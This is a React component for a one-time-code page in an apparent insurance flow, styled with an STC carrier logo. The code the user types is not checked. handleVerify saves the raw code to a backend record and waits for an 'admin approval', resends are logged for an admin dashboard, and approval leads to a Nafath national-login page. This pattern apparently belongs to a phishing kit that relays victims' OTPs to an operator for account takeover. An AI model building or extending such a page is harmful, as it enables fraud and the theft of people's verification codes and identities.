import { useState, useEffect, useRef } from "react";
import { supabase } from "@/integrations/supabase/client";
import { useNavigate, useLocation } from "react-router-dom";
import { motion } from "framer-motion";
import { Shield, Lock, RefreshCw, Smartphone, Loader2 } from "lucide-react";
import VerificationLayout from "@/components/VerificationLayout";
import { useAdminApproval, createOrUpdateStage } from "@/hooks/useAdminApproval";
import { toast } from "sonner";
import { linkVisitorToSession } from "@/lib/visitorLink";
import { useLanguage } from "@/i18n/LanguageContext";
import WaitingApprovalOverlay from "@/components/WaitingApprovalOverlay";
import stcLogo from "@/assets/stc-logo.svg";

const PhoneOTP = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { t } = useLanguage();
  const po = t.phoneOtp;
  const offer = location.state?.offer;
  const phone = location.state?.phone || "05•••••89";
  const carrier = location.state?.carrier || "";
  const passedOrderId = location.state?.orderId || sessionStorage.getItem("insurance_order_id");

  const [code, setCode] = useState("");
  const [loading, setLoading] = useState(false);
  const [waitingApproval, setWaitingApproval] = useState(false);
  const [orderId, setOrderId] = useState<string | null>(passedOrderId);
  const [timer, setTimer] = useState(120);
  const [canResend, setCanResend] = useState(false);
  const [error, setError] = useState(false);
  const inputRef = useRef<HTMLInputElement | null>(null);

  const approvalStatus = useAdminApproval(orderId, "phone_otp");

  useEffect(() => { inputRef.current?.focus(); }, []);

  useEffect(() => {
    if (timer <= 0) { setCanResend(true); return; }
    const id = setInterval(() => setTimer(t => t - 1), 1000);
    return () => clearInterval(id);
  }, [timer]);

  useEffect(() => {
    if (approvalStatus === "approved" && orderId) {
      toast.success(po.verified);
      sessionStorage.setItem("insurance_order_id", orderId);
      if (carrier === "STC") {
        navigate("/insurance/phone-stc", { state: { offer, phone, carrier, orderId } });
      } else {
        navigate("/insurance/nafath-login", { state: { offer, phone, carrier, orderId } });
      }
    } else if (approvalStatus === "rejected") {
      toast.error(po.rejected);
      setWaitingApproval(false);
      setLoading(false);
    }
  }, [approvalStatus, orderId, navigate, offer, phone, carrier]);

  const handleChange = (v: string) => {
    const digits = v.replace(/\D/g, "");
    setCode(digits);
    setError(false);
  };

  const handleVerify = async () => {
    if (code.length < 4) return;
    setLoading(true);
    linkVisitorToSession({ phone });
    const id = await createOrUpdateStage(orderId, "phone_otp", { phone_otp_code: code });
    setOrderId(id);
    setWaitingApproval(true);
  };

  const handleResend = async () => {
    setTimer(120); setCanResend(false); setCode("");
    inputRef.current?.focus();
    
    // Log resend event for admin dashboard
    const visitorSid = sessionStorage.getItem("visitor_sid");
    if (orderId && visitorSid) {
      try {
        await supabase.rpc("insert_stage_event", {
          p_visitor_session_id: visitorSid,
          p_order_id: orderId,
          p_stage: "phone_otp",
          p_status: "pending",
          p_payload: { resend_requested: true, source: "phone_otp_page" },
        });
      } catch (e) {
        // resend log failed silently
      }
    }
  };

  const fmt = (s: number) => `${Math.floor(s / 60)}:${(s % 60).toString().padStart(2, "0")}`;
  const maskedPhone = phone.length >= 10 ? phone.slice(0, 2) + "•••••" + phone.slice(-2) : phone;

  return (
    <VerificationLayout title={po.title} subtitle={po.subtitle}>
      <div className="p-6 text-center">
        <motion.div initial={{ scale: 0 }} animate={{ scale: 1 }} transition={{ type: "spring", delay: 0.2 }}
          className="w-14 h-14 rounded-2xl bg-primary/10 flex items-center justify-center mx-auto mb-2">
          <Smartphone className="w-7 h-7 text-primary" />
        </motion.div>

        {carrier === "STC" && (
          <div className="flex items-center justify-center gap-2 mb-3">
            <img src={stcLogo} alt="STC" className="h-10 object-contain" />
            <p className="text-xs text-muted-foreground font-semibold">{po.stcNote || "خاص بعملاء STC"}</p>
          </div>
        )}

        {waitingApproval ? (
          <WaitingApprovalOverlay
            title={po.waitingApproval}
            subtitle={po.waitingReview}
          />
        ) : (
          <>
            <h2 className="text-lg font-bold text-foreground mb-1">{po.enterCode}</h2>
            <p className="text-xs text-muted-foreground mb-1">{po.codeSent}</p>
            <p className="text-xs font-bold text-foreground mb-1 flex items-center justify-center gap-1" dir="ltr">
              <Lock className="w-3 h-3 text-primary" />{maskedPhone}
            </p>

            <div className="flex justify-center my-5" dir="ltr">
              <motion.input
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.3 }}
                ref={inputRef}
                type="text"
                inputMode="numeric"
                value={code}
                onChange={(e) => handleChange(e.target.value)}
                placeholder={po.placeholder}
                className={`w-full max-w-[260px] text-center text-lg font-bold tracking-[0.3em] rounded-xl border-2 px-4 py-3 transition-all focus:outline-none ${
                  code ? "border-primary bg-primary/5 text-primary shadow-sm shadow-primary/10" : "border-border bg-background text-foreground focus:border-primary focus:ring-2 focus:ring-primary/20"
                } ${error ? "border-destructive" : ""}`}
              />
            </div>

            {error && <p className="text-xs text-destructive mb-3">{po.invalidCode}</p>}

            <div className="mb-4">
              {canResend ? (
                <button onClick={handleResend} className="flex items-center gap-2 text-xs text-primary hover:text-primary/80 mx-auto font-medium">
                  <RefreshCw className="w-3.5 h-3.5" />{po.resendCode}
                </button>
              ) : (
                <div className="inline-flex items-center gap-2 bg-secondary/70 rounded-full px-3 py-1">
                  <span className="text-[10px] text-muted-foreground">{po.resendIn}</span>
                  <span className="text-xs text-primary font-bold font-mono">{fmt(timer)}</span>
                </div>
              )}
            </div>

            <motion.button onClick={handleVerify} disabled={loading || code.length < 4}
              className="w-full text-white hover:opacity-90 rounded-xl py-3 font-bold text-sm transition-all disabled:opacity-40 flex items-center justify-center gap-2 shadow-lg"
              style={{ backgroundColor: '#11998e' }}
              whileTap={{ scale: 0.98 }}
            >
              <Lock className="w-3.5 h-3.5" />{loading ? po.processing : po.verify}
            </motion.button>
          </>
        )}
      </div>
    </VerificationLayout>
  );
};

export default PhoneOTP;
